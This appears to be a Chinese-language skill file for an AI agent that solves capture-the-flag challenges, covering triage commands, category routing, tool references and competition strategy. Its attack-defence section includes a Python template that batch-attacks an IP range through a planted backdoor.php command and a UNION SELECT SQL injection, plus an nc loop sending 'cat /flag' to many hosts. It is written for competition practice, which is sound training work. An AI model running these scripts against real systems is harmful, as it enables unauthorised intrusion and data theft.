---
name: ctf-skills
description: CTF解题技能包。覆盖Web漏洞利用、二进制Pwn、密码学、逆向工程、取证分析和OSINT等CTF挑战解题能力。入口调度器：自动分类题目并路由到对应的技术路径。
metadata:
  openclaw:
    emoji: "🏴"
    category: "security"
    tags: ["ctf", "security", "hacking", "pentest", "crypto", "reverse-engineering"]
---

# CTF Skills — Capture The Flag 解题技能包

CTF 挑战解题。作为入口调度器，自动分析题目特征并路由到对应的解题路径。

---

## 工作流：Solve Challenge 流程

### Step 0: 环境检测

检查关键工具是否可用：
```bash
python3 --version
pip list 2>/dev/null | grep -iE "pwntools|z3|pycryptodome|numpy"
file --version
strings --version  # binutils
```

如需安装工具，参考 **Prerequisites** 中的安装命令。

### Step 1: 信息收集（Triage）

**面对任何题目，先执行以下基础操作：**

```bash
# 文件分析
file *                                    # 识别文件类型
strings * | grep -iE "flag|ctf|secret|password"  # 快速搜索flag
strings * | grep -E '\{.*\}'              # 搜索花括号内容

# Hex分析
xxd task_file | head -30                  # 查看文件头

# 如果是远程服务
nc -v host port                           # 尝试连接
curl -v http://host:port/                 # HTTP服务
echo "test" | nc -w 3 host port

# 如果是二进制
checksec --file=binary                    # 保护机制检查（Linux）
```

### Step 2: 题目分类

根据文件类型和描述判断主分类：

| 文件/描述特征 | 分类 | 路由到 |
|---|---|---|
| `.pcap/.pcapng/.evtx/.dd/.raw` | 取证 | Forensics |
| `.elf/.exe/.so/.dll` + 远程服务 | Pwn | Pwn |
| `.elf/.exe/.so` 无远程服务 | Reverse | Reverse |
| `.apk/.wasm/.pyc/.jar` | Reverse | Reverse |
| `.py/.sage` + RSA/AES/模数 | Crypto | Crypto |
| HTML/JS/PHP 源码或 URL | Web | Web |
| 图片/音频/PDF + 无明文flag | 隐写/取证 | Forensics |
| jails/编码/脑洞题 | Misc | Misc |
| 找人/定位/查资料 | OSINT | OSINT |
| 恶意软件/C2/后门 | Malware | Malware |
| ML模型/AI相关 | AI/ML | AI-ML |
| 智能合约/Solidity/RPC/.sol | Blockchain | Web3/Blockchain |
| AWD/攻防/加固/PWN批量 | AWD | AWD+Web+Pwn |

**关键词判断：**
- "buffer overflow"/"ROP"/"shellcode"/"libc"/"heap" → Pwn
- "RSA"/"AES"/"cipher"/"prime"/"modulus"/"lattice"/"ECC" → Crypto
- "XSS"/"SQL"/"SSRF"/"JWT"/"SSTI"/"upload" → Web
- "disk"/"memory dump"/"PCAP"/"stego"/"隐写" → Forensics
- "find"/"locate"/"track"/"OSINT" → OSINT
- "obfuscated"/"C2"/"malware"/"beacon"/"trojan" → Malware
- "jail"/"sandbox escape"/"encoding"/"RF"/"SDR" → Misc
- "AWD"/"攻防"/"加固"/"waf" → AWD
- "solidity"/"contract"/"Ethereum"/"web3"/"metamask" → Blockchain
- "Move"/"Aptos"/"Sui" → Blockchain
- "reentrancy"/"flash loan"/"oracle" → Blockchain

### Step 3: Quick Wins（先尝试最简路径）

在投入深度分析之前，对所有分类都先尝试：

```bash
# 通用
grep -rniE 'flag\{|CTF\{|ISCC\{' .
strings * | grep -iE 'flag|CTF|secret|password|key|token'

# Web 快速测试
curl -s http://target/robots.txt
curl -s http://target/.git/config
curl -s "http://target/page?id=1'"

# 二进制快速测试
ltrace ./binary  # 捕获库调用
strace -f ./binary  # 捕获系统调用
strings binary | grep -E '^/'  # 找出路径

# 文件隐写快速测试
exiftool file
binwalk file
strings file | tail -50  # 检查文件末尾附加数据
```

### Step 4: 深度分析

如果 Quick Wins 不奏效，根据分类进入对应的深度技术文档：

| 分类 | 参考文件 |
|---|---|
| Web | [ctf-web.md](ctf-web.md) |
| Pwn | [ctf-pwn.md](ctf-pwn.md) |
| Crypto | [ctf-crypto.md](ctf-crypto.md) |
| Reverse | [ctf-reverse.md](ctf-reverse.md) |
| Forensics | [ctf-forensics.md](ctf-forensics.md) |
| Misc | [ctf-misc.md](ctf-misc.md) |
| OSINT | [ctf-osint.md](ctf-osint.md) |
| Malware | [ctf-malware.md](ctf-malware.md) |
| AI/ML | [ctf-aiml.md](ctf-aiml.md) |
| AWD | [ctf-aiml.md](ctf-aiml.md) (AI/ML文档末尾) + 本文档AWD章节 |
| Blockchain | [ctf-web.md](ctf-web.md) (Web3/Blockchain章节) |

### Step 5: 写Writeup

解题完成后，在 `writeup-<challenge-name>.md` 中记录：
1. 题目名、CTF、分类、难度
2. 核心漏洞/技术
3. 解题步骤（不超过5步）
4. 完整解脚本（从题目数据到输出flag）
5. Flag

---

## Quick Start 命令参考（常用）

```bash
# Web
curl -v http://target/ -X POST -d 'key=value'
sqlmap -u "http://target/page?id=1" --batch 2>/dev/null
jwt_tool <token> -T  # JWT分析

# Reverse
strings binary | grep -E 'flag|CTF|secret|password'
rabin2 -z binary  # radare2字符串提取
objdump -d binary | head -100

# Crypto
echo 'base64string' | base64 -d
openssl rsa -pubin -in key.pub -text -noout
python3 -c "from Crypto.Util.number import *; n=...; print(f'bits={n.bit_length()}')"

# Forensics
exiftool file
binwalk -Me file
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri

# Misc
python3 -c "from pwn import *; r=remote('host',port); r.interactive()"
zbarimg qr.png
sox audio.wav -n spectrogram  # 生成频谱图
```

---

## AWD 攻防对抗快速响应

AWD是团队攻防对抗，每人维护自己的服务同时攻击他队。时间紧凑（2-4h），需要工具链自动化。

### AWD 三阶段
```
开局15min: 加固
  - 修改所有弱口令 (SSH/FTP/DB/后台)
  - 备份源码
  - D盾/河马查杀webshell
  - 检查预留后门
  - 添加WAF规则
  - 关键文件只读权限

赛中: 攻击+监控
  - 批量扫描其他队伍服务
  - 从已攻破队伍获取更多攻击面
  - 监控自己的流量发现新攻击
  - 分析攻击流量提取exp

终局: 持续维护
  - 已拿分不丢
  - 注意flag轮换机制
  - 修复被利用的漏洞
```

### AWD 攻击脚本模板
```python
import requests, re, concurrent.futures

def attack(ip):
    try:
        # 预留后门攻击
        r = requests.post(f"http://{ip}/backdoor.php", 
            data={"cmd": "cat /flag"}, timeout=3)
        flag = re.findall(r'flag\{.*?\}', r.text)
        if flag:
            return (ip, flag[0])
        
        # SQL注入批量攻击
        r = requests.get(f"http://{ip}/index.php?id=-1' UNION SELECT 1,flag,3 FROM flag--+")
        flag = re.findall(r'flag\{.*?\}', r.text)
        if flag:
            return (ip, flag[0])
    except:
        pass
    return (ip, None)

# 批量攻击 IP段
targets = [f"10.0.0.{i}" for i in range(2, 51)]
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
    for ip, flag in pool.map(attack, targets):
        if flag:
            print(f"[+] {ip}: {flag}")
            # submit_flag(flag)  # 自动提交
```

### AWD PWN快速加固
```bash
# 检查保护 (先评估难度)
checksec --file=./pwn

# 快速patch: NOP掉危险调用
# IDA中找system/exec → x64dbg patch 90 90 90

# 替换libc (关键!)
# 部分AWD允许替换libc防止堆利用
# patchelf --replace-needed libc.so.6 ./my_libc.so.6 ./pwn

# 输入长度检查脚本 (批量patch)
# 找到每个read(buf, size) → 检查size上限
```

### AWD 常用工具速查
```bash
# Web批量扫描
dirsearch -u http://10.0.0.2 -e php
gobuster dir -u http://10.0.0.2 -w /usr/share/wordlists/dirb/common.txt

# SQL注入批量
sqlmap -u "http://10.0.0.2/page?id=1" --batch --level=3

# PWN批量
for i in $(seq 2 50); do
    (echo "cat /flag"; sleep 1) | nc 10.0.0.$i 9999 &
done
```

---

## 比赛策略

### 节奏控制
```
开局15min: 浏览全部题目 → 找签到题 → 快速拿分
前1h:    解决简单题(T0-T1) → 建立分数基础
中盘:    主攻中档题(T2) → 多方向配合
后1h:    死磕难题(T3) → 同时加固已有分数
```

### 团队分工建议
- **Web手**：Web安全 + AWD加固
- **PWN手**：二进制漏洞 + 内核题
- **Crypto手**：密码学 + 数学
- **RE手**：逆向 + Android/iOS
- **MISC手**：隐写/取证/其他

### 提分技巧
1. 签到题第一时间拿（不要在小题上纠结）
2. 中等题评估投入时间 vs 得分
3. 难题可多人协作（Web + Crypto混合题常见）
4. 及时提交flag（flag可能轮换）
5. AWD: 加固比攻击更重要（保住 > 抢夺）
6. 从攻击流量中学习对手的exp

---

## Prerequisites（工具安装清单）

### Python 包（通用）
```bash
pip install pwntools pycryptodome z3-solver sympy numpy Pillow requests scapy
pip install angr frida-tools capstone pefile  # Reverse
pip install sqlmap flask-unsign               # Web
pip install volatility3 yara-python oletools  # Forensics/Malware
pip install shodan dnspython dnslib            # OSINT
```

### Windows 特有注意
- 大多数 Linux 工具不原生支持，用 Python/MIT License 工具替代
- ffmpeg: `scoop install ffmpeg` 或手动下载
- `file` 命令: 用 Python 的 `magic` 库或 `python3 -c "import magic; print(magic.from_file('file'))"`
- `strings`: PowerShell `Select-String` 或 `Get-Content -AsByteStream`
- 七牛解压: `7z x file`

---

## When to Pivot（什么时候切换思路）

**卡住时重新评估：**
1. 真的是这个分类吗？Web 题可能有 JWT 加密需要 Crypto，取证题的 PCAP 里可能有 Pwn 漏洞
2. 有没有隐藏信息？Magic bytes、文件尾附加数据、元数据注释
3. 更简单的路径？默认密码、已知 CVE、逻辑漏洞而不是溢出
4. 多分类交叉？Web + Crypto（JWT）、Forensics + Crypto（加密文件）、Reverse + Pwn

**常见多分类组合：**
- Web + Crypto: JWT 伪造、自定义签名
- Web + Reverse: WASM、混淆 JS
- Forensics + OSINT: 从图片恢复数据 + 追踪来源
- Reverse + Pwn: 先逆向找漏洞再利用
- Misc + Crypto: jail 中实现加密原语

---

## Flag 格式

常见格式：
- `flag{...}`、`FLAG{...}`、`CTF{...}`
- 特定 CTF: `ISCC{...}`、`picoCTF{...}`、`HTB{...}`、`ENO{...}`
- 有时无包裹纯文本

**校验规则：**
- 找到多个 flag-like 字符串时，优先选择与题目预期行为相符的
- 做全量去重检查

---

## 已解题记录

每次解完题更新 MEMORY.md 的记录，包含：
- 题目类型和文件名
- 核心技术点和自动化脚本路径
- Flag

---
